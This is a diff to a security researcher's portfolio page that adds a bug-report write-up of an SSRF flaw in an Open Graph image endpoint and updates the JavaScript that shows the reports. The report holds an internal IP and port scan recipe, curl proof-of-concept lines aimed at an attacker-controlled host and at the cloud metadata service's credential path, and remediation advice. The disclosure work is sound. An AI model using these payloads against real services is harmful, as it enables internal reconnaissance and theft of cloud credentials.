@@ -179,10 +179,63 @@
     </section>
 
     <section id="report-detail">
-      <h2 id="report-title">Report Title</h2>
-      <p id="report-body">This is a placeholder for the report details. Content will be added soon.</p>
-      <footer>© 2025 codenamevenom — All rights reserved</footer>
-    </section>
+  <div style="max-width:900px;margin:0 auto;padding:20px;">
+    <h2>SSRF — /api/og/statistic</h2>
+    <div id="report-body">
+      <p><strong>Summary:</strong> A server-side request forgery (SSRF) was discovered in an unauthenticated endpoint responsible for generating Open Graph images. The endpoint allowed arbitrary user-supplied URLs via the <code>image</code> GET parameter, which were fetched server-side and returned as a PNG. Due to the lack of input validation and network egress control, this resulted in a full SSRF primitive with deep internal reconnaissance capabilities.</p>
+
+      <h3>🧠 Core Behaviors</h3>
+      <ul>
+        <li>Arbitrary external/internal URL fetching (unauthenticated)</li>
+        <li>Followed HTTP redirects (302, 301)</li>
+        <li>Synchronous blocking — remote response delays impacted backend response time</li>
+        <li>Attacker-controlled content cached under application domain for 1 year</li>
+        <li>Access to <code>169.254.169.254</code> (Instance Metadata Service)</li>
+        <li><strong>Ability to scan internal IPs and discover open ports</strong></li>
+      </ul>
+
+      <h3>🔍 Internal Network Discovery</h3>
+      <pre><code>for ip in 10.0.0.1 to 10.0.0.255:
+  for port in [80,443,8080,8000,5000,3000]:
+    image = f"http://{ip}:{port}/favicon.ico"
+    response = GET /api/og/statistic?image={image}
+    if HTTP 200 or non-empty PNG:
+        log live host and port
+    elif delay > 5s:
+        mark as open|filtered</code></pre>
+
+      <h3>🧨 IMDS Access</h3>
+      <p>Direct access to the Instance Metadata Service (<code>169.254.169.254</code>) was confirmed:</p>
+      <ul>
+        <li><code>/latest/meta-data/</code> → 200 OK</li>
+        <li><code>/latest/meta-data/instance-id</code> → valid instance ID</li>
+        <li><code>/latest/meta-data/iam/security-credentials/</code> → accessible</li>
+      </ul>
+
+      <h3>🧪 PoC Examples</h3>
+      <pre><code>curl -i 'https://target/api/og/statistic?image=https://attacker.oast.pro/poc.png'</code></pre>
+      <pre><code>curl -i 'https://target/api/og/statistic?image=http://169.254.169.254/latest/meta-data/'</code></pre>
+
+      <h3>🎯 Impact</h3>
+      <ul>
+        <li><strong>Full SSRF</strong> with internal IP scan</li>
+        <li><strong>IMDS access</strong> → possible credential leak</li>
+        <li><strong>Persistent cache</strong> of attacker-controlled resources</li>
+        <li><strong>DoS</strong> via delayed responses</li>
+      </ul>
+
+      <h3>🛡 Recommended Remediation</h3>
+      <ul>
+        <li>Denylist/allowlist outbound requests</li>
+        <li>Block private IP ranges</li>
+        <li>Use async + timeouts</li>
+        <li>Enable IMDSv2</li>
+      </ul>
+    </div>
+  </div>
+  <footer>© 2025 codenamevenom — All rights reserved</footer>
+</section>
+
   </main>
 
   <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
@@ -227,21 +280,51 @@
     }
 
     function openReport(id){
-      document.querySelectorAll('main section').forEach(s=>s.classList.remove('active'));
-      document.getElementById('report-detail').classList.add('active');
-      const titleMap={
-        ssrf:"SSRF — /api/og/statistic",
-        idor1:"IDOR — /api/Log",
-        logic:"Business Logic — Weak Email Validation",
-        access:"Improper Access Control — /register",
-        xss:"DOM XSS — /user/auth/chooseschema",
-        idor2:"IDOR — /api/quotes/[UUID]/",
-        idor3:"IDOR — /v2/apps/[ID]/verification-methods"
-      };
-      document.getElementById('report-title').innerText=titleMap[id]||"Report";
-      document.getElementById('report-body').innerText="Detailed content for "+(titleMap[id]||id)+" will be added here.";
-      return false;
+  // show report-detail
+  document.querySelectorAll('main section').forEach(s=>s.classList.remove('active'));
+  const reportSection = document.getElementById('report-detail');
+  if(!reportSection) return false;
+  reportSection.classList.add('active');
+
+  const titleMap = {
+    ssrf: "SSRF — /api/og/statistic",
+    idor1: "IDOR — /api/Log",
+    logic: "Business Logic — Weak Email Validation",
+    access: "Improper Access Control — /register",
+    xss: "DOM XSS — /user/auth/chooseschema",
+    idor2: "IDOR — /api/quotes/[UUID]/",
+    idor3: "IDOR — /v2/apps/[ID]/verification-methods"
+  };
+
+  // aggiorna titolo: preferisci #report-title se esiste, altrimenti il primo h2 dentro report-detail
+  const titleEl = document.getElementById('report-title') || reportSection.querySelector('h2');
+  if(titleEl) titleEl.textContent = titleMap[id] || "Report";
+
+  // Se il report SSRF è già presente staticamente, NON sovrascrivere il body.
+  // Cerchiamo #report-body; se non esiste o non è SSRF, inseriamo placeholder per gli altri id.
+  const bodyEl = document.getElementById('report-body') || reportSection.querySelector('div, p, section');
+
+  if(id === 'ssrf'){
+    // leave existing static content as-is (do not overwrite)
+    // but if you do want to force-insert dynamic content, uncomment and set innerHTML here.
+  } else {
+    // inserisci placeholder dinamico per gli altri report
+    if(bodyEl){
+      bodyEl.innerHTML = `
+        <div style="max-width:900px;margin:0 auto;padding:20px;">
+          <h2>${titleMap[id] || id}</h2>
+          <p>Detailed content for <strong>${titleMap[id] || id}</strong> will be added here.</p>
+          <p style="color:var(--muted);font-size:13px;margin-top:12px;">Placeholder — replace with full report (Summary, PoC, Impact, Remediation).</p>
+        </div>
+      `;
     }
+  }
+
+  // scroll top for visibility
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+  return false;
+}
+
 
     // Initialize About text if About is default (not the case now, but safe)
     if(document.getElementById('about').classList.contains('active')){ particleEffect(); }
